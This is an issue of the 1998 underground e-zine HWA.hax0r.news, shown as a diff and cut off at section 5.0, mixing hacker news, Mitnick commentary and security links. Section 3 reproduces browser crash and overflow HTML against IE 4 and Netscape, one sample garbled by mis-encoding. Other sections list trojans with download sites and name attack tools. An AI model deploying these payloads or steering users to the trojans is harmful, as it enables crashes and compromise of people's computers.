@@ -1,0 +1,1461 @@
+   [42:65:67:69:6E]-[28:63:29:31:39:39:38:20:68:77:61:20:73:74:65:76:65] 
+   
+ ==========================================================================
+ =                    <=-[ HWA.hax0r.news ]-=>                            =
+ ==========================================================================
+  HWA.hax0r.news                      Number 2 Volume 1 December 13th 1998
+ ==========================================================================
+ 
+
+   Synopsis
+   --------
+
+   The purpose of this list is to 'digest' current events of interest that
+  affect the online underground and netizens in general. This includes
+  coverage of general security issues, hacks, exploits, underground news
+  and anything else I think is worthy of a look see.
+
+   This list is NOT meant as a replacement for, nor to compete with, the
+  likes of publications such as CuD or PHRACK or with news sites such as
+  AntiOnline, the Hacker News Network (HNN) or mailing lists such as
+  BUGTRAQ or ISN nor could any other 'digest' of this type do so.
+
+   It *is* intended  however, to  compliment such material and provide a
+  reference to those who follow the culture by keeping tabs on as many
+  sources as possible and providing links to further info, its a labour
+  of love and will be continued for as long as I feel like it, i'm not
+  motivated by dollars or the illusion of fame, did you ever notice how
+  the most famous/infamous hackers are the ones that get caught? there's
+  a lot to be said for remaining just outside the circle... <g>
+ 
+ 
+     @HWA
+     
+  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-
+   		 Welcome to HWA.hax0r.news ... #2
+  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-
+ Issue #2
+ -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-
+ 
+ Section  Content
+ ------- ------------------------------------------------------------------
+  0.0 ... Who am we?
+  0.1 ... COPYRIGHTS
+  1.0 ... Sources
+  1.1 ... Last minute stuff, rumours and newsbytes
+  1.2 ... I wanna be 'leet!, how do I hack?
+  2.0 ... From the editor
+  2.1 ... The USAF Information Warfare Center: Sensor Combat
+  3.0 ... Latest Web Browser Exploits
+  4.0 ... NETBUS news
+  4.1 ... Windows trojans on the rise ...
+  4.2 ... Is it cool to hate Kevin Mitnick?
+  4.3 ... Mitnick Speaks
+  4.4 ... Sinnerz and the Genius
+  4.5 ... More Cash Cowz and k00l t00lz
+  4.6 ... SAFER (Siam relay's security newsletter)
+  5.0 ... Trinux, a micro linux distribution and security tool kit
+  5.1 ... Getting A new IDENTITY
+  5.2 ... Credit card phraud
+  6.0 ... Packet Storm Security is in trouble!
+  6.1 ... Latest exploits & hacks (SSHD etc)
+  6.2 ... cDc releases a new ButtSniffer
+  6.3 ... BOFREEZE crashes BO attackers
+  7.0 ... Hacking IRC'98 : Part 1:  Crashing Eggdrop bots
+  7.1 ... Hacking Websites, (Easier than sucking the salt off your nuts?)
+  8.0 ... ROOTFEST'99
+  9.0 ... PHACVW linx
+
+    -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=---
+    
+0.0  Who is the editor and why is (s)he writing this?
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+    Who cares?
+    ~~~~~~~~~~
+    
+    I am noone, a nobody, I am not a phed or a narq, I could be you. I do
+    this for myself and some friends, you get something out of it too?
+    'whump, there it is'. Thats all there is to it, nothing more, Neither
+    am I a "hax0r" or a "cracker" and hell if I were, you think i'd
+    broadcast it all over some crummy news sheet? heh, get over it, this
+    is meant to be a fun read, nothing more, so get reading. and if you ain't
+    smiling, you're taking things much too seriously. Keep hacking and stay
+    free ... w00t.
+
+    C*:.
+
+     -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-
+
+0.1  (C) COPYRIGHT, (K)OPYWRONG, COPYLEFT?
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+     This file is NOT copyright, some of the content however IS and is
+    marked as such. Copywritten material is used for review purposes only,
+    no monies are made or sought through the distribution of this material.
+    If you have a problem or concern email me and we'll discuss it.
+
+    C*:.
+
+     @HWA
+
+
+1.0  Sources ***
+     ~~~~~~~~~~~
+
+     Sources can be some, all, or none of the following (by no means complete
+    nor listed in any degree of importance) Unless otherwise noted, like msgs
+    from lists or news from other sites, articles and information is compiled
+    and or sourced by Cruciphux no copyright claimed.
+
+  News/Hacker site................. http://www.bikkel.com/~demoniz/
+  News (New site unconfirmed).......http://cnewz98.hypermart.net/
+  News & I/O zine ................. http://www.antionline.com/
+  News + Exploit archive ...........http://www.rootshell.com/beta/news.html
+  News,Advisories,++ ...............http://www.l0pht.com/
+  News site (HNN/l0pht),............http://www.hackernews.com/
+  Back Orifice/cDc..................http://www.cultdeadcow.com/
+  News site+........................http://www.zdnet.com/
+  Help Net Security.................http://help.ims.hr
+  NewsTrolls (HNN)..................http://www.newstrolls.com/
+  HiR:Hackers Information Report... http://axon.jccc.net/hir/
+  CuD ..............................http://www.soci.niu.edu/~cudigest
+
+  +Various mailing lists and some newsgroups, such as ...
+
+  http://www.the-project.org/ .. IRC list/admin archives
+  http://www.anchordesk.com/  .. Jesse Berst's AnchorDesk
+
+  alt.hackers.malicious
+  alt.hackers
+  alt.2600
+  BUGTRAQ
+  ntbugtraq
+  ISN security mailing list
+
+  NEWS Agencies, News search engines etc:
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  http://search.yahoo.com.sg/search/news_sg?p=cracker
+  http://www.cnn.com/SEARCH/
+  http://www.news.com/Searching/Results/1,18,1,00.html?querystr=cracker
+  http://www.foxnews.com/search/cgi-bin/search.cgi?query=cracker&days=0&wires=0&startwire=0
+  http://www.washingtonpost.com/cgi-bin/search?DB_NAME=WPlate&TOTAL_HITLIST=20&DEFAULT_OPERATOR=AND&headline=&WITHIN_FIELD_NAME=.lt.event_date&WITHIN_DAYS=0&description=cracker
+
+     Referenced news links
+     ~~~~~~~~~~~~~~~~~~~~~
+     
+     "Rogues Gallery" - Interesting Hackers Timeline.
+          http://www.wired.com/news/news/politics/story/14856.html
+
+
+      *** Feel free to send in sources of information that you feel provide good
+          coverage or archives of hacker material and i'll add it to the list.
+
+      *** For obvious reasons not all sources are disclosed (duh)
+  
+     @HWA
+
+1.1  Last minute stuff, rumours and newsbytes
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    +++  Dec 12:Justin Petersen aka Agent Steal has been arrested by US
+         Marshals, story on ZDnet:
+         http://www.zdnet.com/zdnn/stories/news/0,4586,2175287,00.html
+
+    +++  Some versions of NetBus Killer have been infected with a virus, the
+         virus is in the uninstall.exe program.
+
+    +++  Keen Veracity, new hacking zine by Legions of the Underground
+         http://www.Genocide2600.com/~tattooman/keen/kv5.txt
+
+    +++  "Are hackers today selling out?" by Space Rogue
+         http://www.hackernews.com/orig/sellout.html"
+
+
+    +++  Securing Redhat Linux v5.x - Interesting online book in progress.
+         http://www.shopthenet.net/redhat-security/index.html
+
+    +++  Dark Eclipse Software (Backdoor trojan, and new trojan killer software
+         "CC" (condom cleaner):  http://surf.to/des
+
+    +++  Use your PalmPilot to steal cars ..
+         http://www.newscientist.com/ns/981205/newsstory6.html
+
+    +++  Use you PalmPilot to redbox calls in Canada ...
+         http://www.hackcanada.com/
+
+    +++  How the DoD cleans up after "spillage" of classified data..
+         http://www.antionline.com/SpecialReports/cdata/
+
+
+    +++  From 100% Pure Bikkel:
+         A bug in Microsoft's NT Server 4.0 can expose a server's user
+         groups and users. It only effects NT servers with no firewall
+         protection. The security breach was discovered last week by
+         Vitali Chkliar. ZDNet reported earlier this week about the
+         hole and wrote that  Chkliar had a webpage with 10 companies
+         listed as susceptible but did not list them for security reasons
+         see the links below for more info:
+
+         http://www.bikkel.com/~demoniz/
+         http://209.4.32.66/NTSecurity/default.asp
+         http://www.zdnet.com/windows/stories/main/0,4728,374497,00.html
+       
+    
+    @HWA
+     
+
+1.2  How do I hack?
+     ~~~~~~~~~~~~~~
+
+      You should probably be asking 'how do I crack?' but thats another story
+    I couldn't leave this alone... so you wanna be a hacker and learn 'mad
+    sk1llz' huh? well first off here are two snippets from a good article
+    from AntiOnline for you to read over.
+
+    Article quotes: http://www.antionline.com/SpecialReports/reflux/
+
+    This article is about the group "ViRii" and their attacks on US govt
+    computers, but it could be about you and your school or whatever ...
+
+    1) So, you're too 'leet to get busted? maybe, maybe not ...
+
+     "You think you have mad skills?, You and your crew are the best?...
+     Thinking your too good to be caught?, Let me tell you... your never
+     going to be caught, your techniques are so goddam elite that you could
+     never be caught by the feds."
+
+     "Your Seriously fucking mistaken...Theres somebody out there who is
+     better then you and they are watching you. -Reflux "
+
+
+    2) Oh and by the way, its not not just YOUR shit that gets messed with:
+
+       "After Makaveli and TooShort were raided, the agents had proceeded to
+       Calldan Coffman's Parents residence in North Bend Oregon where they
+       had confiscated his parents computer hardware and software and went to
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       his grandparents house where they collected more computer equipment and
+           ~~~~~~~~~~~~       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       software.
+       ~~~~~~~~~
+
+      They then raided us, they handed LoaD the Search Warrant and Arrested
+      Calldan Coffman, under federal Arrest Warrants, then they confiscated
+                                                      ~~~~~~~~~~~~~~~~~~~~~
+      all the computer hardware and software and tore the place apart, they
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+      had detained Me, LoaD and Kytten from ViRii and had cuffed Calldan and
+      moved him."
+
+      So, if you have to ask the question 'how do I hack?' or 'how do I become
+     a hacker?' etc then you may as well give up now, you'll just end up in
+     jail. Memorizing "the Mentor's last words" isn't enough .. install FreeBSD
+     Trinux, or Linux on your system, play with it, if you develop a knack for
+     code try contributing to the FreeBSD or Linux (etc) projects, you'll get
+     'mad recognition' and help out the community to boot, oh yeah and the feds
+     won't come and take away daddy's computer system.
+
+    
+     @HWA
+     
+
+2.0  From the editor:
+     ~~~~~~~~~~~~~~~
+
+     START
+     ~~~~~
+       Yeah issue #2 w00t. issue #1 came and went and we survived to tell 
+     about it, quite the feat. The 1st 'issue' was mainly a preview deal 
+     hopefully this one will not be too unwieldly however it won't be any
+     meagre 20k file this time and I make no apologies for that, we're about
+     content and news and providing it untarnished by corporate entities or 
+     phed contamination.
+
+     So... since i'm too tired to write more here and need to crash for a 
+     while before installing the latest FreeBSD snap on my backup machine 
+     i'll end with an invitation to send in information or articles for 
+     inclusion in future issues, just mail it or send as a file attach to
+     the addy below privacy and discretion assured (of course).
+
+     Congrats, thanks, articles, news submissions and kudos to
+     hwa@press.usmc.net complaints and all nastygrams and mailbombs can go
+     to /dev/nul nukes, synfloods and smurfs to 127.0.0.1
+
+     danke.
+
+     C*:.
+
+
+     @HWA
+ 
+ 
+2.1  The USAF Information Warfare Center: Sensor Combat
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+     CONSENT TO MONITORING
+
+     THIS IS A DEPARTMENT OF DEFENSE COMPUTER SYSTEM. THIS COMPUTER SYSTEM,
+     WHICH INCLUDES ALL RELATED EQUIPMENT, NETWORKS AND NETWORK DEVICES
+     (SPECIFICALLY INCLUDING ACCESS TO THE INTERNET), ARE PROVIDED ONLY FOR
+     OFFICIAL U.S. GOVERNMENT BUSINESS.
+
+     DOD COMPUTER SYSTEMS MAY BE MONITORED BY AUTHORIZED PERSONNEL TO ENSURE
+     THAT THEIR USE IS AUTHORIZED, FOR MANAGEMENT OF THE SYSTEM, TO FACILITATE
+     PROTECTION AGAINST UNAUTHORIZED ACCESS, AND TO VERIFY SECURITY PROCEDURES.
+     MONITORING INCLUDES "HACKER" ATTACKS TO TEST OR VERIFY THE SECURITY OF
+     THIS SYSTEM AGAINST USE BY UNAUTHORIZED PERSONS. DURING THESE ACTIVITIES,
+     INFORMATION STORED ON THIS SYSTEM MAY BE EXAMINED, COPIED AND USED FOR
+     AUTHORIZED PURPOSES, AND DATA OR PROGRAMS MAY BE PLACED INTO THIS SYSTEM.
+     THEREFORE, INFORMATION YOU PLACE ON THIS SYSTEM IS NOT PRIVATE.
+
+     USE OF THIS DOD COMPUTER SYSTEM, AUTHORIZED OR UNAUTHORIZED, CONSTITUTES
+     CONSENT TO OFFICIAL MONITORING OF THIS SYSTEM. UNAUTHORIZED USE OF A DOD
+     COMPUTER SYSTEM MAY SUBJECT YOU TO CRIMINAL PROSECUTION. EVIDENCE OF
+     UNAUTHORIZED USE COLLECTED DURING MONITORING MAY BE PROVIDED TO APPROPRIATE
+     PERSONNEL FOR ADMINISTRATIVE, CRIMINAL OR OTHER ACTION.
+
+     Wargames
+     ~~~~~~~~
+
+      You've probably heard of these guys or others like them, (the 609th
+     were recently featured on America At Arms on TV) they are the people
+     that are watching you after you get past the ".. monitored.." system
+     banner on *.mil computer networked boxes. If you haven't been busted
+     yet then you're probably not causing enough shit, but don't think for
+     one minute that you're not being watched... there are bigger fish to
+     fry in the InfoWar arena.
+
+      Anyway, on to the fun stuff, I stumbled across the SensorCombat system
+     while doing research on the 609th and InfoWar topic, there are screen
+     shots available and the site promises to have a downloadable demo soon,
+     it looks pretty interesting. This isn't the 'Doom' 3d game you may have
+     seen the marines practicing with on tv its a tactical simulation game..
+     check it out.
+
+     "The SENSOR COMBAT program is a single-player/user campaign-level series
+      of wargames, each game designed to illustrate the full dimension of
+      warfare.
+
+      SENSOR COMBAT utilizes modern military strategy and tactics, but adds
+      the 5 pillars of IW in contemporary scenarios depicting missions
+      ranging from peacekeeping operations (Bosnia) to major regional
+      conflicts (Korea).  Political events can also impact the operation.
+      The goal is to create a computer-simulated battlefield where different
+      strategies can be evaluated, providing the player/student with insight
+      into gaining information dominance."
+
+
+     Sources/References/Related links:
+
+     Air Intelligence Agency, Information Warfare, Kelly AFB
+     http://www.aia.af.mil/
+     http://www.afiwc.aia.af.mil/what/SensorCombat/SensorCombat.html
+
+     http://www.af.mil/lib/afissues/1998/issue98.html
+
+     Crypt newsletter article:
+     http://www.soci.niu.edu/~crypt/other/609.htm
+
+     FAS article (Federation of American Scientists)
+     http://www.fas.org/irp/agency/aia/cyberspokesman/97aug/afiwc.htm
+     
+     
+     @HWA
+  
+
+3.0  Latest Web Browser Exploits
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     So you have the latest Netscape or MSIE? well its probably vulnerable
+    to at least one exploit.
+
+
+    Alert: IE 4.0 Security Zone compromise
+    Aleph One (aleph1@DFW.NET)
+    Tue, 20 Oct 1998 11:06:13 -0500
+
+    New Internet Explorer vulnerability. As opposed to what Russ states below
+    there is a new risk created by this vulnerability. The default setting for
+    authentication in IE for the Medium security setting is to automatically
+    logon to machines in the Intranet zone when the web server requests user
+    authentication without prompting the user. Nice way for someone to go
+    finishing for passwords by posting some message with an embedded URL in a
+    newsgroup or mass emailing some corporation.
+
+    Aleph One / aleph1@dfw.net
+    http://underground.org/
+    KeyID 1024/948FD6B5
+    Fingerprint EE C9 E8 AA CB AF 09 61  8C 39 EA 47 A8 6A B8 01
+
+    ---------- Forwarded message ----------
+    Date: Mon, 19 Oct 1998 21:06:16 -0400
+    From: Russ <Russ.Cooper@RC.ON.CA>
+    To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
+    Subject: Alert: IE 4.0 Security Zone compromise
+
+    Sune Hansen, Webmaster of <http://www.WorldWideWait.com>, discovered a
+    security problem which affects Trust Zones within Internet Explorer
+    4.0+.
+
+    Basically, if you provide IE with <http://3475932041>, you'll arrive at
+    Microsoft's web site. However, it will be listed, and treated, as part
+    of your Local Intranet Zone when in fact it should be part of any other
+    zone.
+
+    For anyone who has made no modifications to their zones (i.e. using the
+    defaults supplied with IE), there is no difference since both Local
+    Intranet Zone and Internet Zone are set to "Medium" security.
+
+    If, however, modifications have been made to the zone security
+    configuration such that, for example, the Internet Zone is more
+    restrictive than the Local Intranet Zone, then the fact such 32-bit URLs
+    end up being seen by IE as trusted can create a problem.
+
+    IE appears to assume that anything it sees without a period in the URL
+    should be treated as part of the Local Intranet Zone. Winsock then takes
+    the address and properly translates it to a reachable IP address (you
+    could just as easily use PING or some other utility with such an
+    address).
+
+    Sune tested this on Windows '98, and I've tested it on NT 4.0 SP4 RC2
+    with IE 4.0 (SP1;2735 - 4.72.3110.8), and both caused the same problem.
+
+    Essentially the problem exists within IE, and not NT, but since Sune is
+    franticly seeking out media outlets to report the story, I figured it
+    was worth a note here. Microsoft did receive a brief message from Sune
+    on Sunday morning, although they were made more aware of the issues by
+    the media trying to verify Sune's claims.
+
+    I'm not trying to downplay the problem. Anyone who is using Trust Zones
+    should understand that they, alone, will not prevent a site from placing
+    a URL in the above fashion and causing a site to be viewed as a Local
+    Intranet Zone site. Proxies, and Firewalls, however, are not affected by
+    this and will properly enforce restrictions if so configured. The
+    problem appears to reside entirely within the mechanism that IE uses to
+    determine if something is part of the Local Intranet Zone when no
+    servers are configured in that zone.
+
+    My conversations with Microsoft indicate we will hear more when they
+    have more fully investigated the ramifications of the issue.
+    
+    Cheers,
+    Russ
+    
+    MSIE Exploits and crashing
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~
+    Microsoft Internet Explorer 4.0(1) (3.02 is reported not to be vulnerable) 
+    under win95, win98 and NT can be crashed and eventually made execute arbitrary code 
+    with a little help from the <EMBED> tag.
+
+    The following:
+    <EMBED SRC=file://C|/A.ABOUT_200_CHARACTERS_HERE___________________>
+    opens a dialog box and closes IE 4.0.
+    It seems that the long file extension causes stack overrun.
+
+    The stack is smashed - full with our values, EIP is also ours and CS=SS.
+    So a string could be constructed, executing code at the client's machine.
+
+
+    Solution: Microsoft has issued a patch at their site - "Embed issue".
+    To try this: http://www.geocities.com/ResearchTriangle/1711/msie.html
+
+
+    Georgi Guninski
+    http://www.geocities.com/ResearchTriangle/1711
+
+    -----------------------[ Start crash code ]--------------------- 
+    <HTML>
+    Trying to crash IE 4.71
+    <EMBED SRC=file://C|/A.012345678901234567890123456789012345678901234567890123456
+    78901234567890123456789012345678901234567890123456789012345678901234567890123456
+    78901234567890123456789012345678901234567890123456789012345678901234567890123456
+    78901234567890123456789>
+    </HTML>
+    -----------------------[ end crash code ]------------------------ 
+
+
+
+    This url will crash MSIE 4.x
+    http://
+    
+    This code will crash MSIE 4.0 and 4.01
+    
+    http://www.geocities.com/ResearchTriangle/1711/external.html    
+    
+    This code will crash Microsoft Explorer 4.71:                             
+    
+    -----------------------[ Start crash code ]--------------------- 
+    <HTML>
+    Crashing IE 4.71
+    <OBJECT CLASSID=A응응응응응응응응응응응응응응응응응응응응응응응응응응응�
+    응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응
+    응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응
+    응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응
+    응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응
+    응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응
+    응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응응>
+    </OBJECT>
+    <BR>
+    </CENTER>
+    </HTML>
+    -----------------------[ end crash code ]------------------------ 
+
+
+
+    Netscape #1
+    ~~~~~~~~~~~
+    -----------------------[ Start crash code ]--------------------- 
+    <html>
+    <head>
+    <title>NS Go Boom</title>
+    </head>
+    <body>
+    <table>
+    <tr><td>
+    <p style="border: none">
+    BOOM!
+    </td></tr>
+    </table>
+    You won't see this text.
+    <p><a href="http://members.tripod.com/~hwa_2k/">Some Url</a>
+    </body>
+    </html>
+    -----------------------[ end crash code ]------------------------ 
+
+    Netscape #2
+    ~~~~~~~~~~~
+
+     Georgi Guninski wrote:
+
+     > There is a bug in Netscape Communicator 4.5 for Windows 95 and 4.05 for
+     > WinNT 4.0
+     > (probably others) which allows reading files from the user's computer.
+     > It is not necessary the file name to be known, because directories may
+     > be browsed.
+     > The contents of the file may be sent to an arbitrary host. In order this
+     > to work, you need both Java and Javascript
+     > enabled. The bug may be exploited by email message.
+     >
+     > Demonstration is available at:
+     > http://www.geocities.com/ResearchTriangle/1711/b6.html
+     >
+     > Workaround: Disable Javascript or Java.
+     >
+
+     I have just tested this bug in Netscape 4.5 on a RedHat Linux 5.1 machine,
+     Kermel 2.0.34 and with minor patching of the java, it is also effective.  I
+     was sucessful in retrieving ANY LOCAL FILE with the World readable
+     attribute. This includes the /etc/passwd file!  In netscape,
+     Edit>Preferences>Advanced>Disable Javascript in Mail and News will block
+     this exploit, unless the person has access to your web server.
+        
+
+     Directly related/Good resources:
+    
+     http://www.geocities.com/ResearchTriangle/1711/index.html (George Guninski)
+     http://www.cen.uiuc.edu/~ejk/browser-security.html
+     http://www.microsoft.com/security/bulletins/
+
+     Sorta related/interesting:    
+    
+     http://nosik.neystadt.org/nosik/SSI/morejava.html
+    
+     @HWA
+    
+4.0  NETBUS News
+     ~~~~~~~~~~~
+       Last issue I posted a bunch of urls where Netbus was seen, prompting a
+     "will the real home page please stand up?" response <g> well demoniz has
+     posted that the current netbus home page (current version is 1.70 btw)
+     is on Angelfire at:
+
+     http://www.angelfire.com/ab/netbussite/
+
+     You can bet it won't be there for long, also HNN's main site has reported
+     the homepage can be found on a Brazillian server at:
+
+     http://www.nwh.he.com.br/
+     
+     @HWA
+
+4.1  Windows Trojans on the rise..
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+     I have recently found many new trojans presumeably inspired by the
+     infamous cDc Back Orifice and the Netbus trojans, both of which I have
+     tested and found quite effective. I decided to take a look at what
+     else was floating around and the following is a brief list of what i
+     was able to uncover, I've not had a chance to try these all out yet but
+     intend to make them available or at least link to the sites where they
+     may be obtained so you can scrutinize them. What you don't know CAN and
+     DOES hurt you...
+
+     Trojan list: (For my reference - = still need it, + = have it) if you
+     have one of the 'needs' or know where I can find it for review purposes
+     please mail me. tnx.
+
+     -Acid Shiver
+     +BackDoor
+     +BackOffrice
+     ?Control du Socket
+     +Control Access
+     +Deep Throat
+     +Gatecrasher
+     -Gjamer
+     -Girlfriend (and boyfriend) client/server (Not released yet)
+     +ICQ Trojan
+     +MastersParadise
+     -Millennium (not released yet - HCVORG site)
+     +NetBus
+     +NetSpy
+     -phAse zero
+     -RAW
+     -SysProtect 98
+     +Sockets Du Trois
+     -TeleCommando
+
+     A couple of sites where trojans may be found:
+
+     http://www.ufl.edu/~cycy92n/........ PHAC site - trojan files
+     http://www.legion2000.org/hcvorg/ .. PHAC site - HcVORG Trojan files
+
+     @HWA
+
+
+4.2  Is it cool to hate Kevin Mitnick?
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+     "How do criminals guilty of committing brutal racial crimes
+      avoid jail altogether... why are defendants accused by the
+      US Government of running organized crime granted bail...
+      Why is Kevin Mitnick being treated more harshly than these
+      criminals?" - http://www.kevinmitnick.com/home.html
+
+
+      In order to truly be elite, you don't want a FREE KEVIN banner on your
+     site, you don't want to stand up for basic human rights, you don't want
+     to educate yourself, you want to KILL KEVIN, FUCK KEVIN, BURN KEVIN.
+     Yeah man, maybe after you've been in jail for 3yrs without a trial like
+     Kevin Mitnick has you'll really be Fucking Hostile.
+
+      This is the biggest bunch of shit i've seen in a long time, I can truly
+     understand where these people are coming from and the ideas behind the
+     outrage but I feel it is grossly misdirected. Sure there has been a lot
+     of exposure on the net, sure people are posting 'Free Kevin' virtual
+     stickers everywhere, and so they damn well should, haven't you gotten
+     the point yet? the U.S govt is making a mockery of basic civil rights
+     damn straight people are pissed off.
+
+      It is NOT cool, it is NOT 'leet and it is completely STUPID to endorse
+     this sort of movement. Lets nix this now before the joke comes back and
+     bites you on the ass. If you don't know the story then shut the fuck up,
+     you have no right to comment on it. If you truly believe Kevin is getting
+     what he deserves then you are a misdirected moron or a fucking phed. - Ed
+     C*:.
+     
+     
+     @HWA
+           
+
+4.2a Comparitive Sentences of other hackers in the news...
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+     Sourced from: http://www.wired.com/news/news/politics/story/14856.html
+     And http://www.paranoia.com/
+
+     Comparitive sentences:
+
+
+   1990 - ROBERT TAPPAN MORRIS  ("The InterNet Worm")
+          Sentence: three years probation, community service, fine.
+
+   1990 - LEGION OF DOOM
+          Sentences: 14 to 21 months in prison
+
+   1991 - KEVIN POULSEN
+          Sentence: four years in prison, three-year ban from computer use,
+          fine
+
+   1992 - MOD (MASTERS OF DECEPTION)
+          Sentences: six months to one year in prison, community service,
+          probation
+
+   1995 - JUSTIN TANNER PETERSEN
+          Sentence: 3.5 years in prison, restricted use of computers for
+          three years, fine
+
+   1998 - JUSTIN TANNER PETERSEN Jailed/released for bail violation
+          ** Currently wanted for bail violation, has fled country.
+
+
+
+     Anti-Kevin site:
+      http://www.sinnerz.org/fh (Fucking Hostile's kill-kevin campaign)
+
+     For information on Kevin Mitnick's current status:
+      (Mitnick's trial has now been delayed until April 20, 1999 by HIS
+       request see article following ...)
+
+      http://www.kevinmitnick.com/home.html
+
+     Books:
+
+          The Fugitve Game - Johnathan Littman
+          TAKEDOWN - John Markoff and Tsutomu Shimomura
+
+    [ Read and learn ]
+    
+
+    @HWA
+    
+
+
+4.3 Mitnick Speaks
+    ~~~~~~~~~~~~~~
+    Source: Wired News
+
+    Mitnick: 'I Am Tired of Delays'
+    by Douglas Thomas
+
+    2:09 p.m.  7.Dec.98.PST
+    LOS ANGELES -- Alleged computer cracker Kevin Mitnick said a three-month
+    delay in the start of his trial will still not give his defense adequate
+    time to review the government's case against him.
+
+    Full story:
+    http://www.wired.com/news/news/politics/story/16684.html
+    
+    
+    @HWA
+
+
+4.4 Sinnerz and the Genius
+    ~~~~~~~~~~~~~~~~~~~~~~
+
+    This sounds pretty damn kewl, but be careful checking it out ;-)
+
+    Features of GENIUS.EXE (NOTE: I haven't played with this yet ...)
+
+    From the sinnerz site:
+
+    o Comsumes only 2% of system resources
+    o Multi-threaded - no hangs!
+    o Unobtrusive tray application - saves screen real estate
+    o Copy your local IP, hostname, or an ASCII character to the Windows clipboard
+    o Clipboard viewer
+    o Finger client
+    o FTP client
+    o Raw HTTP Browser
+    o Ping
+    o Trace Route
+    o SMTP client
+    o Telnet client with VT100 emulation
+    o NTP (Network Time Protocol) client
+    o Whois client
+    o Current Connections - lists all connections to and from your computer
+    o Download Manager - download a list of HTTP files
+    o Name Scanner - resolve a block of IPs
+    o NSLookup - convert IPs to Hostnames or visa versa
+    o Patience - clean the spam out of your email account
+    o Port Info - look up a port number in a database
+    o Service Scanner - check the daemon name/version on different ports of an IP block
+    o Site Checker - check to see if your favorite sites have been updated
+    o Address Book - maintain a detailed list of contact
+    o Notes - keep multiple notes handy (good for book/music/movie lists)
+    o Passwords - keep all of your passwords in one secure place
+    o To Do List - keep track of all the things you need to do
+    o Clear the Start Menu | Documents list
+    o Clean out the Windows temporary directory
+    o Conversions - convert one unit to another
+    o Grep - search the files on your hard drive
+    o Password Generator - create strong, random passwords
+    o UUEncode - encodes/decodes .uue files
+    o Check Mail - tell you how many messages are in your mailbox
+    o Finger Server
+    o IdentD Server
+    o Portscan Detection - alerts you if someone is portscanning you
+    o Port Watcher - keeps track of all connections for up to 5 different ports
+    o Stay Alive - keeps your ISP from dropping your connection
+    o Extensive help file
+    o User-defined global hot keys - hit Ctrl+Shift+M to check your mail!
+    o Plus an incredible interface!
+
+    Get it here http://www.sinnerz.com/genius/
+    
+    @HWA
+
+
+4.5 More Cash Cows and k00l t00lz
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    http://www.born2hack.com/html/news.html
+
+    - Reason why exactly you should get a born2hack.com CD
+    [born2hack.com CD's will not be given out to everyone, they are
+    reserved for a *higher* level user]
+
+    mailto:email@born2hack.com
+
+    The fee which you would pay if you are accepted is 25 USD.
+
+    "- how to communicate with a remote machine the same style than `acid
+    burn' did with `zero cool/crash override' when he was hacking MTV in
+    the movie hackers."
+
+    "Reason why exactly you should get a born2hack.com forwarding
+    address [born2hack.com addresses will not be given out to everyone,
+    they are reserved for a *higher* level user]"
+
+    mailto:cd@born2hack.com
+
+    The fee which you would pay if you are accepted is 20 USD/3 months.
+
+    Yeah, ok.
+       
+       
+    @HWA
+    
+
+4.6 SAFER - Security Alert For Enterprise Resources by SIAM RELAY
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    SAFER is a security newsletter published by the folks at Siam Relay
+    and outlines current threats and countermeasures for the sysadmin.
+
+    Source: http://www.siamrelay.com/safer/
+    From safer#6: (SAFER#7 now out)
+
+    UNDERGROUND TOOLS
+
+    Here are the new tools that hackers/crackers will soon use against
+    your systems. We do not recommend that you use such tools against any
+    resources without prior authorization. We only list new tools published
+    since the last issue of SAFER.
+
+    mountdscan.c
+     - Scanner that looks for server vulnerable to rpc.mountd security hole.
+    rpc.ttdbserver.c
+     - remote buffer overflow exploit for Solaris, IRIX and HP-UX.
+    brkill.c
+     - Allows you to reset TCP/IP connection on Windows 95/NT computers.
+    rockme.c
+     - MS Outlook DoS attack by using long subject line.
+    wipe-1.00.tgz
+     - UTMP/WTMP log cleaner.
+    ftpcheck.pl
+     - Scans subnets for anonymous ftp servers.
+    relaycheck.pl
+     - Scans subnets for SMTP servers that allows relaying (read: spamming).
+     
+    @HWA
+
+
+5.0 Trinux a micro-linux distribution and security tool
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
